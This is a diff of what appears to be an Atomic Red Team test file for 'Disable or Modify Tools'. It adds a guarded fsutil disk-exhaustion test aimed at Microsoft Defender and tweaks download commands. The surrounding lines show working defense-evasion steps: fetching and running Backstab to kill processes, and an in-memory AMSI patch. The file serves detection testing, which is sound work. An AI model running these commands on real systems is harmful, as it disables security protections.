@@ -1,5 +1,5 @@
 attack_technique: T1685
-display_name: 'Disable or Modify Tools'
+display_name: "Disable or Modify Tools"
 atomic_tests:
 - name: Windows Disable LSA Protection
   auto_generated_guid: 40075d5f-3a70-4c66-9125-f72bee87247d
@@ -252,7 +252,7 @@ atomic_tests:
       if ((cmd.exe /c "where.exe Sysmon.exe 2> nul | findstr /i Sysmon 2> nul") -or (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe")) { exit 0 } else { exit 1 }
     get_prereq_command: |
       New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
-      Invoke-WebRequest "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\Sysmon.zip"
+      Invoke-WebRequest "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\Sysmon.zip" -UseBasicParsing
       Expand-Archive "PathToAtomicsFolder\..\ExternalPayloads\Sysmon.zip" "PathToAtomicsFolder\..\ExternalPayloads\Sysmon" -Force
   - description: |
       sysmon must be Installed
@@ -303,7 +303,7 @@ atomic_tests:
     get_prereq_command: |
       $parentpath = Split-Path "#{sysmon_exe}"; $zippath = "$parentpath\Sysmon.zip"
       New-Item -ItemType Directory $parentpath -Force | Out-Null
-      Invoke-WebRequest "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "$zippath"
+      Invoke-WebRequest "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "$zippath" -UseBasicParsing
       Expand-Archive $zippath $parentpath -Force; Remove-Item $zippath
       if(-not ($Env:Path).contains($parentpath)){$Env:Path += ";$parentpath"}
   - description: |
@@ -645,7 +645,7 @@ atomic_tests:
       if(Test-Path -Path "#{AdvancedRun_Location}") {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
-      Invoke-WebRequest "http://www.nirsoft.net/utils/advancedrun.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\advancedrun.zip"
+      Invoke-WebRequest "http://www.nirsoft.net/utils/advancedrun.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\advancedrun.zip" -UseBasicParsing
       Expand-Archive -path "PathToAtomicsFolder\..\ExternalPayloads\advancedrun.zip" -destinationpath "PathToAtomicsFolder\..\ExternalPayloads\" -Force
   executor:
     command: |
@@ -676,7 +676,7 @@ atomic_tests:
     prereq_command: if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\Backstab64.exe") {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
-      Invoke-WebRequest "https://github.com/Yaxser/Backstab/releases/download/v1.0.1-beta/Backstab64.exe" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\Backstab64.exe"
+      Invoke-WebRequest "https://github.com/Yaxser/Backstab/releases/download/v1.0.1-beta/Backstab64.exe" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\Backstab64.exe" -UseBasicParsing
   executor:
     command: |
       & "PathToAtomicsFolder\..\ExternalPayloads\Backstab64.exe" -k -n #{process_name}
@@ -1560,7 +1560,7 @@ atomic_tests:
     prereq_command: if (Test-Path "#{ps_exec_location}") {exit 0} else {exit 1}
     get_prereq_command: |-
       New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
-      Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PStools.zip"
+      Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PStools.zip" -UseBasicParsing
       expand-archive -literalpath "PathToAtomicsFolder\..\ExternalPayloads\PStools.zip" -destinationpath "PathToAtomicsFolder\..\ExternalPayloads\pstools" -force
   executor:
     command: cmd /c "#{ps_exec_location}" -accepteula -i -s cmd.exe /c logman update trace "#{session}" --p "#{provider}" -ets
@@ -1775,3 +1775,91 @@ atomic_tests:
       [AMSI.Win32]::VirtualProtect($addr, [UIntPtr]::new($patch.Length), 0x40, [ref]$oldProtect) | Out-Null
       [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, $patch.Length)
       [AMSI.Win32]::VirtualProtect($addr, [UIntPtr]::new($patch.Length), $oldProtect, [ref]$oldProtect) | Out-Null
+- name: Impair Windows Defender via Disk Space Exhaustion using fsutil
+  auto_generated_guid: 0486ee68-cfde-41a3-823f-7a0d96fa84a1
+  description: |
+    Simulates defense impairment by leveraging the built-in Windows utility fsutil.exe to create an arbitrary oversized hidden file in the user %TEMP% directory.
+    In real-world evasion (e.g., BigDiskBuster technique), adversaries size a hidden GUID-named file to consume all available free disk space on the system drive. This condition causes Microsoft Defender Antivirus platform updates and dynamic signature downloads to fail due to disk exhaustion (ERROR_DISK_FULL / 0x80070070), freezing definition updates while keeping nominal services running.
+
+    This test creates a non-destructive temporary test file to validate detection telemetry without crashing the system drive.
+
+    References:
+    - https://lolbas-project.github.io/lolbas/Binaries/Fsutil/
+    - https://github.com/LOLBAS-Project/LOLBAS/pull/525
+    - https://www.itsc.cuhk.edu.hk/all-it/information-security/information-security-alerts/microsoft-denial-of-service-vulnerability-bigdiskbuster-cve-unknown/
+    - https://github.com/DevCop95/BDB-Guardian
+  supported_platforms:
+  - windows
+  input_arguments:
+    file_path:
+      description: Path of the temporary file to create
+      type: path
+      default: $env:TEMP\{15755e6b-a54d-4a6e-9773-554c724f8a63}
+    file_size_bytes:
+      description: Size of the dummy file to allocate in bytes (defaults to 10MB for safe testing)
+      type: integer
+      default: 10485760
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $targetPath = [System.IO.Path]::GetFullPath("#{file_path}")
+      $tempRoot = [System.IO.Path]::GetFullPath($env:TEMP).TrimEnd('\') + '\'
+      if (-not $targetPath.StartsWith($tempRoot, [System.StringComparison]::OrdinalIgnoreCase)) {
+        throw "Refusing to create a test file outside the current user's TEMP directory: $targetPath"
+      }
+
+      $markerPath = "$targetPath.atomic-test-owner"
+      if ([System.IO.File]::Exists($targetPath) -or [System.IO.Directory]::Exists($targetPath)) {
+        throw "Refusing to overwrite an existing path: $targetPath"
+      }
+      if ([System.IO.File]::Exists($markerPath)) {
+        throw "Refusing to reuse an existing ownership marker: $markerPath"
+      }
+
+      $pendingMarker = "AtomicTest T1685 pending`n$targetPath"
+      [System.IO.File]::WriteAllText($markerPath, $pendingMarker)
+      try {
+        & fsutil.exe file createnew $targetPath #{file_size_bytes}
+        if ($LASTEXITCODE -ne 0) {
+          throw "fsutil failed with exit code $LASTEXITCODE"
+        }
+
+        [System.IO.File]::SetAttributes($targetPath, ([System.IO.File]::GetAttributes($targetPath) -bor [System.IO.FileAttributes]::Hidden))
+        $createdFile = Get-Item -LiteralPath $targetPath -Force -ErrorAction Stop
+        $ownerMarker = "AtomicTest T1685`n$targetPath`n$($createdFile.CreationTimeUtc.Ticks)`n$($createdFile.LastWriteTimeUtc.Ticks)`n$($createdFile.Length)"
+        [System.IO.File]::WriteAllText($markerPath, $ownerMarker)
+      }
+      catch {
+        if ([System.IO.File]::Exists($markerPath) -and ([System.IO.File]::ReadAllText($markerPath) -ceq $pendingMarker)) {
+          Remove-Item -LiteralPath $markerPath -Force
+        }
+        throw
+      }
+    cleanup_command: |
+      $targetPath = [System.IO.Path]::GetFullPath("#{file_path}")
+      $tempRoot = [System.IO.Path]::GetFullPath($env:TEMP).TrimEnd('\') + '\'
+      if (-not $targetPath.StartsWith($tempRoot, [System.StringComparison]::OrdinalIgnoreCase)) {
+        throw "Refusing to clean a file outside the current user's TEMP directory: $targetPath"
+      }
+
+      $markerPath = "$targetPath.atomic-test-owner"
+      if ([System.IO.File]::Exists($markerPath)) {
+        $markerLines = ([System.IO.File]::ReadAllText($markerPath)) -split "`n"
+        if ($markerLines.Count -eq 5 -and $markerLines[0] -ceq 'AtomicTest T1685' -and $markerLines[1] -ceq $targetPath) {
+          if ([System.IO.File]::Exists($targetPath)) {
+            $target = Get-Item -LiteralPath $targetPath -Force -ErrorAction Stop
+            $matchesMarker = ($target.CreationTimeUtc.Ticks -eq [long]$markerLines[2]) -and
+              ($target.LastWriteTimeUtc.Ticks -eq [long]$markerLines[3]) -and
+              ($target.Length -eq [long]$markerLines[4])
+            if ($matchesMarker) {
+              Remove-Item -LiteralPath $targetPath -Force -ErrorAction Stop
+            }
+            else {
+              Write-Warning "Leaving $targetPath in place because it no longer matches the file created by this test."
+              return
+            }
+          }
+          Remove-Item -LiteralPath $markerPath -Force -ErrorAction Stop
+        }
+      }
